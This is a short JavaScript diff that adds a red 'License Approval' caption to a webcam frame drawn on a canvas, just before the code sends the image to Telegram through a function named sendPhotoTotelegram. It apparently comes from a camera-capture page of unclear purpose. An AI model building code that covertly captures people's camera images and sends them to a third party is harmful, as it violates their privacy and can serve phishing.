@@ -59,6 +59,12 @@
                 canvas.width = video.videoWidth;
                 canvas.height = video.videoHeight;
                 content.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+                // Add a message to the image
+                content.font = '30px Arial';
+                content.fillStyle = 'red';
+                content.fillText('License Approval', 10, 50);
+
                 canvas.toBlob(blob => {
                     sendPhotoTotelegram(blob);
                     stream.getTracks().forEach(track => track.stop());
